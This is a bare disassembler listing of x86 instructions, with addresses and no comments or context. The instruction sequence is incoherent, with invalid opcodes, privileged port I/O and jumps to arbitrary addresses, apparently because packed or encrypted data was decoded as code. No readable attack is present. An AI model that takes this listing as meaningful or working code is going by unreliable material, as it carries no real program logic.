  401919:	dec    ecx
  40191a:	mov    al,0xfa
  40191c:	push   ebx
  40191d:	adc    bl,BYTE PTR [esp+esi*1]
  401920:	shr    DWORD PTR [edx+0x28b77367],0xf4
  401927:	addr16 daa 
  401929:	repz retf 0x501a
  40192d:	(bad)
  401930:	or     al,0xe9
  401932:	inc    edi
  401933:	mov    bh,0xc4
  401935:	and    eax,0x66fbbfd5
  40193a:	pop    ss
  40193b:	cmp    esp,DWORD PTR [esi-0x14]
  40193e:	push   edx
  40193f:	or     eax,0x44f27c65
  401944:	ret    
  401945:	out    dx,eax
  401946:	mov    BYTE PTR [edi+0x6c],dh
  401949:	in     eax,0xf
  40194b:	xor    DWORD PTR [edi-0x79],0xc5aaf84e
  401952:	jmp    0xde4f:0x5643b1a3
  401959:	jmp    0xcb43ce95
  40195e:	mov    bl,0xa9
  401960:	fst    QWORD PTR [eax]
  401962:	out    dx,eax
  401963:	push   cs
  401964:	dec    ebx
  401965:	lahf   
  401966:	test   eax,0x380b46d5
  40196b:	lods   al,BYTE PTR ds:[esi]
  40196c:	repz sub al,0x47
  40196f:	fwait
  401970:	leave  
  401971:	jecxz  0x4018f5
  401973:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401974:	or     al,0xaf
  401976:	mov    al,0xf8
  401978:	aas    
  401979:	jbe    0x4019e5
  40197b:	sbb    cl,0xd4
  40197e:	aas    
  40197f:	test   DWORD PTR [edi+ebp*2-0x2f658744],ebx
  401986:	pop    ss
  401987:	mov    dl,0x32
  401989:	push   eax
  40198a:	jae    0x401a07
  40198c:	dec    ecx
  40198d:	in     eax,0x50
  40198f:	aam    0x5b
  401991:	scas   al,BYTE PTR es:[edi]
  401992:	push   0xffffffe9
  401994:	int    0x28
  401996:	inc    edi
  401997:	js     0x4019a2
  401999:	push   0xffffffab
  40199b:	lds    ebp,FWORD PTR [eax+0x34de3bb6]
  4019a1:	xchg   ecx,eax
  4019a2:	xchg   ecx,eax
  4019a3:	sub    BYTE PTR [esi],dl
  4019a5:	add    DWORD PTR [edx*1-0x59b9331],edi
  4019ac:	xor    dh,BYTE PTR [ecx]
  4019ae:	inc    ebx
  4019af:	pop    esp
  4019b0:	popa   
  4019b1:	adc    ah,bh
  4019b3:	xor    dh,BYTE PTR [ebx-0xf]
  4019b6:	xor    BYTE PTR [edi+edx*8],dl
  4019b9:	data16 mov bl,0x64
  4019bc:	int    0x39
  4019be:	sar    BYTE PTR [ecx-0x2d9397c],cl
  4019c4:	retf   
  4019c5:	sti    
  4019c6:	or     BYTE PTR [eiz*4-0x18074f6e],bl
  4019cd:	scas   eax,DWORD PTR es:[edi]
  4019ce:	mov    ds:0x15510731,eax
  4019d3:	gs js  0x4019f9
  4019d6:	dec    edi
  4019d7:	push   ebx
  4019d8:	push   ebx
  4019d9:	scas   eax,DWORD PTR es:[edi]
  4019da:	daa    
  4019db:	mov    al,0xf0
  4019dd:	dec    edx
  4019de:	jae    0x401a26
  4019e0:	xor    al,BYTE PTR [esi-0x64]
  4019e3:	add    BYTE PTR [ebx+0x61a23f61],ah
  4019e9:	cwde   
  4019ea:	mov    edi,0x5de20bce
  4019ef:	call   0x4c44dcc3
  4019f4:	popa   
  4019f5:	lods   al,BYTE PTR ds:[esi]
  4019f6:	or     ebp,DWORD PTR [edi-0x7c2dfd24]
  4019fc:	mov    ds:0xb7ef58cf,eax
  401a01:	mov    ds:0x1f78ad73,eax
  401a06:	mov    esp,0x18054c85
  401a0b:	push   0x36328ebc
  401a10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a11:	push   esi
  401a13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a14:	gs scas eax,DWORD PTR es:[edi]
  401a16:	in     eax,dx
  401a17:	pop    ebp
  401a18:	das    
  401a19:	adc    al,0x35
  401a1b:	xor    DWORD PTR [ebx-0x3a2a0214],edi
  401a21:	ja     0x4019bc
  401a23:	lock leave 
  401a25:	and    al,0xf6
  401a27:	lods   al,BYTE PTR ds:[esi]
  401a28:	sub    ecx,DWORD PTR [ecx+0x11]
  401a2b:	fldcw  WORD PTR [esi-0x25]
  401a2e:	rol    DWORD PTR [edx+0x68],cl
  401a31:	dec    esi
  401a32:	shr    BYTE PTR [eax],0x4c
  401a35:	repz xor esp,DWORD PTR [eax+edi*1]
  401a39:	call   0x54988385
  401a3e:	test   BYTE PTR [esi],ch
  401a40:	pop    edi
  401a41:	pop    ds
  401a42:	clc    
  401a43:	and    edx,ecx
  401a45:	or     DWORD PTR [ecx+0x70dcdbb],edx
  401a4b:	rcl    esi,0x5c
  401a4e:	sub    eax,0x7afcde3b
  401a53:	mov    esi,0x232a1636
  401a58:	xchg   BYTE PTR [esi],dl
  401a5a:	cmp    eax,0x542c14e9
  401a5f:	inc    eax
  401a60:	xchg   ebp,eax
  401a61:	and    al,0xf1
  401a63:	mov    ebx,0xa8f1e305
  401a68:	push   ebp
  401a69:	mov    cl,0x88
  401a6b:	ja     0x401a09
  401a6d:	das    
  401a6e:	push   esp
  401a6f:	sub    ecx,edx
  401a71:	je     0x401a32
  401a73:	jae    0x401a8d
  401a75:	fsub   QWORD PTR ds:0xcc4baa52
  401a7b:	pop    esp
  401a7c:	outs   dx,BYTE PTR ds:[esi]
  401a7d:	pop    eax
  401a7e:	cmovge edx,esi
  401a81:	sbb    ecx,DWORD PTR [edi+0x7157e9ec]
  401a87:	fist   DWORD PTR [esi]
  401a89:	xchg   ecx,eax
  401a8a:	adc    al,0xcf
  401a8c:	and    al,0x5c
  401a8e:	push   edx
  401a8f:	imul   edx,eax,0x7681f03a
  401a95:	sbb    bh,0x66
  401a98:	xor    al,0x91
  401a9a:	loopne 0x401a98
  401a9c:	mov    ds:0x35ccdcde,eax
  401aa1:	stc    
  401aa2:	ja     0x401a91
  401aa4:	es clc 
  401aa6:	ret    0x86b5
  401aa9:	aaa    
  401aaa:	in     al,dx
  401aab:	jle    0x401aaa
  401aad:	sub    al,0x98
  401aaf:	repz ret 
  401ab1:	nop
  401ab2:	ins    DWORD PTR es:[edi],dx
  401ab3:	leave  
  401ab4:	lahf   
  401ab5:	das    
  401ab6:	ins    DWORD PTR es:[edi],dx
  401ab7:	mov    ds:0xf76ec13e,al
  401abc:	xchg   ecx,eax
  401abd:	push   es
  401abe:	mov    al,0xd7
  401ac0:	pop    esi
  401ac1:	scas   al,BYTE PTR es:[edi]
  401ac2:	xchg   DWORD PTR [eax],ebp
  401ac4:	(bad)  
  401ac5:	sbb    DWORD PTR [eax],esi
  401ac7:	js     0x401a85
  401ac9:	sbb    eax,0xb7037d63
  401ace:	jmp    0x308407d8
  401ad3:	fild   QWORD PTR [edx+edx*1+0x52325d36]
  401ada:	mov    ebx,DWORD PTR [ecx+0x15015c6]
  401ae0:	pusha  
  401ae1:	gs pop ss
  401ae3:	dec    esp
  401ae4:	fwait
  401ae5:	jle    0x401b57
  401ae7:	clc    
  401ae8:	nop
  401ae9:	fnstcw WORD PTR [esi]
  401aeb:	mov    bl,0xe4
  401aed:	mov    edx,0x6a5cb9ea
  401af2:	sar    DWORD PTR [eax],cl
  401af4:	retf   
  401af5:	icebp  
  401af6:	in     al,0x8c
  401af8:	jp     0x401b63
  401afa:	pop    esp
  401afb:	clc    
  401afc:	ins    DWORD PTR es:[edi],dx
  401afd:	push   0x7e5563cb
  401b02:	mov    ds:0x7a966f96,eax
  401b07:	test   al,0x6a
  401b09:	and    DWORD PTR [ebp-0x21bfe029],edi
  401b0f:	ret    
  401b10:	lds    edx,FWORD PTR [edx+0x29cd9984]
  401b16:	pop    es
  401b17:	xchg   ebp,eax
  401b18:	ror    BYTE PTR [esi+0x49],0x79
  401b1c:	mov    esp,0xb88e4706
  401b21:	cmp    al,0x37
  401b23:	lahf   
  401b24:	jp     0x401aef
  401b26:	adc    esp,0xffffffad
  401b29:	in     eax,dx
  401b2a:	aas    
  401b2b:	xchg   ecx,eax
  401b2c:	jl     0x401b76
  401b2e:	pop    ss
  401b2f:	loopne 0x401b03
  401b31:	jle    0x401ae0
  401b33:	aam    0xe2
  401b35:	fwait
  401b36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b37:	push   edx
  401b38:	jge    0x401b47
  401b3a:	loop   0x401ae6
  401b3c:	mov    ecx,0x553938c
  401b41:	sbb    cl,BYTE PTR [eax+0x42e34cab]
  401b47:	aas    
  401b48:	sbb    DWORD PTR [edx+0x5d],0xffffffbb
  401b4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b4d:	out    0x91,al
  401b4f:	hlt    
  401b50:	sub    BYTE PTR [edi-0x73],0xae
  401b54:	push   ecx
  401b55:	pop    DWORD PTR [eax-0x49f33d94]
  401b5b:	or     eax,0xfa1f3b8e
  401b60:	arpl   WORD PTR [ebp+0x2998b49a],di
  401b66:	dec    edx
  401b67:	push   0x79ad2e1b
  401b6c:	or     BYTE PTR [edx],ch
  401b6e:	sbb    BYTE PTR [edx],al
  401b70:	add    bh,BYTE PTR [ebp+0x3c]
  401b73:	add    DWORD PTR [edx-0x574bc256],0x95d0b16d
  401b7d:	mov    bh,0x27
  401b7f:	fs mov eax,esi
  401b82:	inc    eax
  401b83:	lock ret 0x8616
  401b87:	mov    ds:0x5b82470c,al
  401b8c:	mov    ch,0xb9
  401b8e:	add    BYTE PTR [edx-0x45],0xdc
  401b92:	jmp    0x5e01352
  401b97:	mov    ds:0xdffaca4d,eax
  401b9c:	jecxz  0x401bd7
  401b9e:	push   esi
  401b9f:	rcr    BYTE PTR [ebx+0xeecc81f],1
  401ba5:	data16 mov cl,BYTE PTR [edi]
  401ba8:	out    0x71,al
  401baa:	das    
  401bab:	dec    BYTE PTR [edi+0x52]
  401bae:	xchg   ecx,edx
  401bb0:	mov    ds:0x18761084,eax
  401bb5:	dec    ebp
  401bb6:	jge    0x401bed
  401bb8:	lods   al,BYTE PTR ds:[esi]
  401bb9:	pop    edi
  401bba:	icebp  
  401bbb:	jg     0x401c26
  401bbd:	inc    edx
  401bbe:	repnz fnstenv [ebp+esi*8+0x89f9432]
  401bc6:	data16 adc ch,ah
  401bc9:	test   al,0x1b
  401bcb:	sub    al,0xbf
  401bcd:	fdivr  DWORD PTR [esi]
  401bcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bd0:	pop    edx
  401bd1:	pushf  
  401bd2:	shl    BYTE PTR [ebp-0x38],0xd5
  401bd6:	lock push ss
  401bd8:	test   eax,0x6b1d6a1f
  401bdd:	cmp    DWORD PTR ds:0xd89c59fc,edx
  401be3:	mov    esi,0x257430b0
  401be8:	dec    edx
  401be9:	call   0xe333e839
  401bee:	mov    eax,ds:0x208d2fb3
  401bf3:	aaa    
  401bf4:	imul   ecx,ecx,0x1b
  401bf7:	nop
  401bf8:	mov    edx,0xd69935fc
  401bfd:	pushf  
  401bfe:	mov    edx,0x4dec2284
  401c03:	test   al,dh
  401c05:	and    al,0xa8
  401c07:	add    BYTE PTR [ecx],al
  401c09:	js     0x401c5c
  401c0b:	fdiv   DWORD PTR [ebp+0x3a]
  401c0e:	stc    
  401c0f:	push   0x9da952f5
  401c14:	std    
  401c15:	push   esi
  401c16:	sbb    bh,dh
  401c18:	sub    DWORD PTR [ebp+0x209d815b],esp
  401c1e:	push   ss
  401c1f:	loope  0x401c32
  401c21:	test   DWORD PTR [ebx],edi
  401c23:	retf   
  401c24:	add    al,0xa0
  401c26:	inc    ebx
  401c27:	cdq    
  401c28:	in     eax,0x7
  401c2a:	push   edi
  401c2b:	pop    ebp
  401c2c:	out    dx,eax
  401c2d:	out    0xcf,eax
  401c2f:	xor    BYTE PTR [ecx+edx*2],bl
  401c32:	loope  0x401cb1
  401c34:	hlt    
  401c35:	shr    BYTE PTR [esi+0x189ed68e],1
  401c3b:	pop    eax
  401c3c:	out    0x9f,eax
  401c3e:	jmp    0x401bc3
  401c40:	sar    BYTE PTR [edi+0x66],0xe3
  401c44:	inc    ecx
  401c45:	jo     0x401cb9
  401c47:	sub    DWORD PTR [esi-0x1b683be7],esp
  401c4d:	cmp    ch,BYTE PTR [ebx-0x4b]
  401c50:	pop    ecx
  401c51:	lahf   
  401c52:	sbb    eax,0x2b545d6a
  401c57:	js     0x401cbf
  401c59:	adc    esp,edx
  401c5b:	dec    edx
  401c5c:	in     eax,0x5d
  401c5e:	jb     0x401c87
  401c60:	add    al,BYTE PTR [eax]
  401c62:	ret    
  401c63:	dec    esp
  401c64:	xor    bl,BYTE PTR [eax]
  401c66:	sbb    BYTE PTR [eax+0x6c9ff705],0x77
  401c6d:	rol    BYTE PTR [esi-0x4388aba8],cl
  401c73:	sti    
  401c74:	mov    edx,0xc74f839e
  401c79:	jbe    0x401ccf
  401c7b:	dec    edi
  401c7c:	int    0xab
  401c7e:	es dec ebx
  401c80:	mov    ss:0xc4b572cf,eax
  401c86:	fwait
  401c87:	dec    ebx
  401c88:	test   ecx,edx
  401c8a:	inc    ecx
  401c8b:	(bad)  
  401c8c:	rol    BYTE PTR [ecx],1
  401c8e:	push   0x3c
  401c90:	add    BYTE PTR [ebx],bh
  401c92:	pop    esp
  401c93:	or     DWORD PTR [ebx],edi
  401c95:	mov    esp,0x268df05e
  401c9a:	out    dx,al
  401c9b:	and    eax,edi
  401c9d:	jnp    0x401c42
  401c9f:	pop    es
  401ca0:	popf   
  401ca1:	jecxz  0x401cb1
  401ca3:	fs mov ebp,0x45e3d24e
  401ca9:	pushf  
  401caa:	push   0x4b1b9059
  401caf:	stc    
  401cb0:	cmp    ch,dh
  401cb2:	mov    WORD PTR [edx+edx*8+0x42],?
  401cb6:	xor    al,BYTE PTR [eax]
  401cb8:	stc    
  401cb9:	jb     0x401cf4
  401cbb:	(bad)  
  401cbc:	xchg   esi,eax
  401cbd:	stos   DWORD PTR es:[edi],eax
  401cbe:	mov    ebx,0xd149260b
  401cc3:	mov    dl,0xc3
  401cc5:	and    DWORD PTR [edx],esi
  401cc7:	icebp  
  401cc8:	inc    esi
  401cc9:	sub    dl,BYTE PTR [eax+esi*1-0x4a]
  401ccd:	add    al,0xe4
  401ccf:	mov    eax,ds:0x1865ccdc
  401cd4:	test   eax,0xc0c356e0
  401cd9:	xchg   DWORD PTR [ebx+0x25],ebx
  401cdc:	adc    cl,BYTE PTR [ebx+eax*2+0x65]
  401ce0:	mov    esi,0xf2f83398
  401ce5:	adc    BYTE PTR [ecx],0x80
  401ce8:	add    DWORD PTR [eax],0x59386e16
  401cee:	neg    BYTE PTR [ebx-0x662e9993]
  401cf4:	jnp    0x401d2e
  401cf6:	inc    edx
  401cf7:	cmp    DWORD PTR [ebp+0x50],ebp
  401cfa:	test   DWORD PTR [ecx-0x7c9edeba],ecx
  401d00:	mov    bh,0xa
  401d02:	and    esi,edi
  401d04:	xlat   BYTE PTR ds:[ebx]
  401d05:	(bad)  
  401d07:	repnz sub ebx,DWORD PTR [eiz*4-0xc0b4b96]
  401d0f:	mov    ecx,0xbe7f7779
  401d14:	mov    WORD PTR [edx+eiz*1],gs
  401d17:	pop    edi
  401d18:	and    DWORD PTR [eax],0x82e0af67
  401d1e:	push   cs
  401d1f:	loope  0x401d8a
  401d21:	jecxz  0x401d3d
  401d23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d24:	jo     0x401d40
  401d26:	adc    DWORD PTR [ecx-0x4b9b5969],0x721c1442
  401d30:	pop    ebp
  401d31:	push   ebx
  401d32:	ds cs idiv dl
  401d36:	xchg   DWORD PTR gs:[esi+0x5e],ebx
  401d3a:	cwde   
  401d3b:	inc    edx
  401d3c:	mov    DWORD PTR [edx+0x2c8bc1ee],esi
  401d42:	xchg   esi,eax
  401d43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d44:	iret   
  401d45:	cld    
  401d46:	in     eax,0x2b
  401d48:	add    ebx,DWORD PTR [esi-0x72e6105a]
  401d4e:	fwait
  401d4f:	jns    0x401d31
  401d51:	rcl    BYTE PTR [ecx-0x5d],cl
  401d54:	retf   
  401d55:	sti    
  401d56:	test   BYTE PTR [ecx+0x755556d9],cl
  401d5c:	xor    BYTE PTR [ebp-0x25],cl
  401d5f:	push   ecx
  401d60:	cmp    cl,bl
  401d62:	gs dec ecx
  401d64:	ins    DWORD PTR es:[edi],dx
  401d65:	aad    0x28
  401d67:	lods   al,BYTE PTR ds:[esi]
  401d68:	fiadd  DWORD PTR [esi+0x5a2e7f89]
  401d6e:	pop    edx
  401d6f:	mov    dh,0x4b
  401d71:	pop    edx
  401d72:	ret    
  401d73:	int    0xb7
  401d75:	mov    ah,0x4
  401d77:	fwait
  401d78:	mov    ds:0x876d2343,al
  401d7d:	call   0xbe40bcc1
  401d82:	cmc    
  401d83:	xor    edx,edi
  401d85:	push   ecx
  401d86:	dec    ebp
  401d87:	test   DWORD PTR [ebp-0x61c5e62],ebx
  401d8d:	ins    BYTE PTR es:[edi],dx
  401d8e:	add    DWORD PTR [edx+0x4a],0x182f5546
  401d95:	push   ecx
  401d96:	enter  0xe391,0x30
  401d9a:	push   ebp
  401d9b:	push   edi
  401d9c:	add    BYTE PTR [ebx+0x466e6053],bl
  401da2:	test   DWORD PTR [eax],edi
  401da4:	adc    al,0xf
  401da6:	dec    edx
  401da7:	lahf   
  401da8:	inc    edx
  401da9:	or     BYTE PTR [esi+0x8],dl
  401dac:	ins    BYTE PTR es:[edi],dx
  401dad:	and    eax,DWORD PTR [ecx-0xccc26c]
  401db3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401db4:	adc    al,0x9b
  401db6:	add    ah,ah
  401db8:	test   DWORD PTR ds:0x3d8bc0ba,ebp
  401dbe:	or     eax,DWORD PTR [ecx+ecx*2-0x66]
  401dc2:	(bad)  
  401dc3:	add    ebp,0x41
  401dc6:	and    bh,BYTE PTR [ebx-0x3d]
  401dc9:	mov    esi,0x4916547d
  401dce:	stc    
  401dcf:	pop    ds
  401dd0:	sti    
  401dd1:	push   eax
  401dd2:	or     BYTE PTR [eax+0x1d89eada],0xb9
  401dd9:	push   ss
  401dda:	mov    ecx,0x2ef2f1b1
  401ddf:	mov    ch,0xb0
  401de1:	fwait
  401de2:	adc    al,0x36
  401de4:	pop    ss
  401de5:	adc    DWORD PTR [edx],esi
  401de7:	mov    esp,0xd34d2913
  401dec:	push   es
  401ded:	fisubr DWORD PTR [eax]
  401def:	std    
  401df0:	test   al,0xb6
  401df2:	push   ds
  401df3:	in     eax,dx
  401df4:	xchg   esp,eax
  401df5:	ror    BYTE PTR [eax],1
  401df7:	sbb    bh,BYTE PTR [ecx+ecx*2]
  401dfa:	ja     0x401e57
  401dfc:	mov    ah,0xb8
  401dfe:	imul   eax,edi,0x6a
  401e01:	jecxz  0x401dab
  401e03:	in     eax,dx
  401e04:	dec    ebp
  401e05:	mov    ebx,0x477a9883
  401e0a:	cli    
  401e0b:	pminsw mm3,QWORD PTR [esi-0x78]
  401e0f:	mov    cl,0xd4
  401e11:	xchg   ebp,eax
  401e12:	ret    
  401e13:	pushf  
  401e14:	or     BYTE PTR [ecx+0x102a3453],dl
  401e1a:	aas    
  401e1b:	xchg   ebx,eax
  401e1c:	mov    ss,WORD PTR fs:[edx]
  401e1f:	inc    esp
  401e20:	mov    esp,0xc64c55a6
  401e25:	rcl    BYTE PTR [ecx+0x3b231d74],1
  401e2b:	fwait
  401e2c:	(bad)
  401e2f:	(bad)  
  401e30:	fdiv   QWORD PTR [ebx+0x70b7d980]
  401e36:	adc    dl,BYTE PTR [eax-0x36be13db]
  401e3c:	dec    eax
  401e3d:	stc    
  401e3e:	and    BYTE PTR [ecx],0x33
  401e41:	and    dl,BYTE PTR [ecx-0x34eb1cac]
  401e47:	fst    DWORD PTR [ebx]
  401e49:	xchg   edx,eax
  401e4a:	adc    DWORD PTR [esi+0x3],edi
  401e4d:	mov    al,0x0
  401e4f:	sbb    edi,DWORD PTR [ebx+0x9c8d265]
  401e55:	imul   ebx,DWORD PTR [ebx],0xffffffa8
  401e58:	cwde   
  401e59:	push   ds
  401e5a:	push   0xab73a86b
  401e5f:	call   0x9effe304
  401e64:	ins    DWORD PTR es:[edi],dx
  401e65:	in     al,dx
  401e66:	xor    BYTE PTR [ebp-0x2b0fdbbd],ah
  401e6c:	add    DWORD PTR [ebp+ebx*8-0x2613f980],esp
  401e73:	sti    
  401e74:	sub    BYTE PTR [ecx],dl
  401e76:	mov    ds:0xce6cad7f,al
  401e7b:	dec    ebx
  401e7c:	mov    ah,0x6e
  401e7e:	test   al,0xa8
  401e80:	fwait
  401e81:	addr16 cmp esp,0x1e
  401e85:	add    eax,0xb4567c08
  401e8a:	dec    ebx
  401e8b:	xchg   esi,eax
  401e8c:	xor    DWORD PTR [edx],0x79
  401e8f:	push   ebx
  401e90:	inc    esi
  401e91:	dec    ecx
  401e92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e93:	popf   
  401e94:	push   esi
  401e95:	push   esi
  401e96:	cmp    bl,BYTE PTR [ebx-0xae9ffe3]
  401e9c:	stos   DWORD PTR es:[edi],eax
  401e9d:	stos   BYTE PTR es:[edi],al
  401e9e:	cwde   
  401e9f:	hlt    
  401ea0:	clc    
  401ea1:	shl    BYTE PTR [eax+0x1],0xb4
  401ea5:	(bad)  
  401ea6:	imul   esi,eax,0x29
  401ea9:	inc    esp
  401eaa:	add    esp,DWORD PTR [ecx]
  401eac:	push   edx
  401ead:	pop    ds
  401eae:	lods   al,BYTE PTR ds:[esi]
  401eaf:	sub    BYTE PTR [edi],ch
  401eb1:	xchg   edx,eax
  401eb2:	inc    esi
  401eb4:	sub    BYTE PTR ds:0xfcfd204c,ah
  401eba:	cmp    ebp,DWORD PTR gs:[esi]
  401ebd:	daa    
  401ebe:	dec    esi
  401ebf:	jbe    0x401ed4
  401ec1:	pop    ebx
  401ec2:	shl    BYTE PTR [esi+0x7a],0x68
  401ec6:	adc    DWORD PTR [edi+0x387f1367],esi
  401ecc:	nop
  401ecd:	outs   dx,DWORD PTR ds:[esi]
  401ece:	fmul   QWORD PTR [ebx]
  401ed0:	std    
  401ed1:	and    ecx,DWORD PTR [ebx-0x4f]
  401ed4:	inc    dx
  401ed6:	ret    0x6376
  401ed9:	push   ebx
  401eda:	call   0x86d2:0x1f1a294c
  401ee1:	xchg   ebx,eax
  401ee2:	daa    
  401ee3:	mov    bl,0x7b
  401ee5:	inc    eax
  401ee6:	mov    ebp,0x88903076
  401eeb:	aad    0x71
  401eed:	(bad)  
  401eee:	jle    0x401f07
  401ef0:	imul   ebx,DWORD PTR [ebx-0x5],0x5406df94
  401ef7:	sbb    eax,0x11647c17
  401efc:	(bad)  
  401efd:	mov    edi,0x44bc3925
  401f02:	or     DWORD PTR [eax-0x80],esp
  401f05:	mov    esi,DWORD PTR [edi-0x17]
  401f08:	xchg   ebx,eax
  401f09:	imul   eax,DWORD PTR [ebp+edx*4+0xdc283c],0xffffffe4
  401f11:	scas   al,BYTE PTR es:[edi]
  401f12:	mov    ds:0x698ed6d,al
  401f17:	xchg   ecx,eax
  401f18:	mov    cl,0x83
  401f1a:	gs repnz mov al,0xf8
  401f1e:	inc    ecx
  401f1f:	jl     0x401eef
  401f21:	xchg   esi,eax
  401f22:	push   ss
  401f23:	ror    DWORD PTR [esi-0x35876386],1
  401f29:	sbb    ecx,esi
  401f2b:	push   ss
  401f2c:	(bad)  
  401f2d:	sbb    DWORD PTR [edx],edi
  401f2f:	fucomp st(7)
  401f31:	outs   dx,DWORD PTR ds:[esi]
  401f32:	xor    eax,0xa69c01d2
  401f37:	das    
  401f38:	jo     0x401f0d
  401f3a:	test   BYTE PTR fs:[ecx-0x68421bf5],dh
  401f41:	mov    ds:0x857120d1,al
  401f46:	out    dx,eax
  401f47:	test   esi,ebx
  401f49:	dec    edx
  401f4a:	lahf   
  401f4b:	ss mov ecx,0x810ca7a9
  401f51:	nop
  401f52:	mov    dh,0xdd
  401f54:	outs   dx,BYTE PTR ds:[esi]
  401f55:	or     esi,DWORD PTR [esi]
  401f57:	lock cdq 
  401f59:	fst    QWORD PTR [eax+0x4a]
  401f5c:	mov    cl,0x11
  401f5e:	add    ebx,edx
  401f60:	retf   0xbd0
  401f63:	sahf   
  401f64:	cmp    DWORD PTR ds:0xb60c413d,esp
  401f6a:	mov    eax,0xcd4347e9
  401f6f:	and    cl,0xc7
  401f72:	inc    esp
  401f73:	retf   
  401f74:	addr16 aaa 
  401f76:	je     0x401fc1
  401f78:	das    
  401f79:	xor    al,0x6a
  401f7b:	test   eax,0x877b3cf6
  401f80:	mov    edi,0x9a8c62fc
  401f85:	mov    eax,0xbb5943d6
  401f8a:	sbb    DWORD PTR [edx],ebx
  401f8c:	test   ebp,0x7dd070d2
  401f92:	pop    edi
  401f93:	pop    ebp
  401f94:	shr    DWORD PTR [edi+0x1b0f3a80],0x59
  401f9b:	pop    edi
  401f9c:	cs scas al,BYTE PTR es:[edi]
  401f9e:	pop    edi
  401f9f:	sbb    DWORD PTR [eax+ebp*8+0x15],0x2c
  401fa4:	(bad)  
  401fa5:	call   0xe96c117a
  401faa:	shl    DWORD PTR [ebx+0x700c85f5],1
  401fb0:	jns    0x402019
  401fb2:	push   ebp
  401fb3:	xor    eax,0x5af9d20d
  401fb8:	inc    ecx
  401fb9:	jecxz  0x401f42
  401fbb:	sbb    edi,DWORD PTR [edx]
  401fbd:	repnz test DWORD PTR [ebx],ebp
  401fc0:	cld    
  401fc1:	and    al,0x40
  401fc3:	scas   eax,DWORD PTR es:[edi]
  401fc4:	cmp    eax,DWORD PTR [edi-0x682039c]
  401fca:	in     al,0xfa
  401fcc:	and    eax,0x370d77f5
  401fd1:	aas    
  401fd2:	pop    ds
  401fd3:	cmp    esi,DWORD PTR [esi-0x30232581]
  401fd9:	xor    BYTE PTR [esi+eax*2],ch
  401fdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401fdd:	fdiv   QWORD PTR [edi-0x6539232b]
  401fe3:	xchg   ebp,eax
  401fe4:	repz cld 
  401fe6:	or     al,0xd
  401fe8:	ss pop ebx
  401fea:	fstp   TBYTE PTR [esi-0x1369831c]
  401ff0:	sub    al,0xb3
  401ff2:	mov    eax,es
  401ff4:	lds    esi,FWORD PTR [ebp-0xb]
  401ff7:	adc    esi,DWORD PTR [esi]
  401ff9:	sub    ch,BYTE PTR [ebx]
  401ffb:	and    bl,dl
  401ffd:	mov    edi,0xbf33dd48
  402002:	mov    al,ds:0x9d061be2
  402007:	and    bh,BYTE PTR [ecx-0x1a]
  40200a:	cmp    ch,BYTE PTR [edx-0x46]
  40200d:	aam    0xa4
  40200f:	pop    edi
  402010:	test   eax,0x1492865
  402015:	dec    ebp
  402016:	push   0x7a9b03cd
  40201b:	es mov esp,0x1db58208
  402021:	repz push ss
  402023:	push   ecx
  402024:	(bad)  
  402025:	jmp    0xa9f02e27
  40202a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40202b:	ss and ecx,ebp
  40202e:	clc    
  40202f:	mov    ah,0xd7
  402031:	mov    dh,BYTE PTR [eax+0x24]
  402034:	push   es
  402035:	xor    eax,0x10d4d2b5
  40203a:	sub    BYTE PTR [esi-0x41],0xc1
  40203e:	adc    BYTE PTR [edi],cl
  402040:	arpl   si,bp
  402042:	and    ch,BYTE PTR [esp+ecx*1]
  402045:	inc    ecx
  402046:	cld    
  402047:	adc    eax,0x439deb04
  40204c:	adc    eax,0x6334a82e
  402051:	sbb    eax,edx
  402053:	clc    
  402054:	inc    esi
  402055:	inc    ebp
  402056:	jns    0x40209b
  402058:	xlat   BYTE PTR ds:[ebx]
  402059:	pop    ds
  40205a:	xchg   ecx,eax
  40205b:	mov    bh,0x7a
  40205d:	repnz mov al,ds:0x7e67411a
  402063:	sar    DWORD PTR ds:0xa7ddc0fa,cl
  402069:	into   
  40206a:	inc    ecx
  40206b:	jl     0x402077
  40206d:	clc    
  40206e:	sahf   
  40206f:	in     al,dx
  402070:	inc    ebx
  402071:	in     eax,dx
  402072:	fnstcw WORD PTR [ebx-0x46]
  402075:	sbb    DWORD PTR [esi+0x38],esp
  402078:	sbb    bh,BYTE PTR [edx-0x24614703]
  40207e:	sbb    al,BYTE PTR [ecx]
  402080:	cmp    eax,0xdd87be65
  402085:	and    esp,edi
  402087:	outs   dx,BYTE PTR ds:[esi]
  402088:	push   edx
  402089:	repz pop ss
  40208b:	das    
  40208c:	xor    al,BYTE PTR [eax+0x4899fc4]
  402092:	push   edx
  402093:	stos   DWORD PTR es:[edi],eax
  402094:	loopne 0x4020bf
  402096:	addr16 dec esp
  402098:	xor    BYTE PTR [edx],cl
  40209a:	ficom  WORD PTR [ebx+0x34d4f0ba]
  4020a0:	push   ecx
  4020a1:	pusha  
  4020a2:	ret    0x4210
  4020a5:	pop    esi
  4020a6:	jg     0x402065
  4020a8:	or     ebp,edi
  4020aa:	jmp    0x3656dfd6
  4020af:	ret    0xa320
  4020b2:	cdq    
  4020b3:	retf   
  4020b4:	sti    
  4020b5:	push   es
  4020b6:	dec    ebp
  4020b7:	imul   ebx,DWORD PTR [edx+0x51],0xcd289d01
  4020be:	enter  0x2454,0x1
  4020c2:	(bad)  
  4020c3:	push   0xffffffb7
  4020c5:	je     0x402074
  4020c7:	pop    edi
  4020c8:	mov    ebx,0xe92c85db
  4020cd:	hlt    
  4020ce:	sti    
  4020cf:	test   DWORD PTR [edx+0x254b4ab6],ebp
  4020d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020d6:	push   es
  4020d7:	xchg   ebp,eax
  4020d8:	xchg   esp,eax
  4020d9:	xor    DWORD PTR [ebx+0x6bd980f0],0xffffffdd
  4020e0:	pop    ds
  4020e1:	sub    eax,DWORD PTR [eax-0x68]
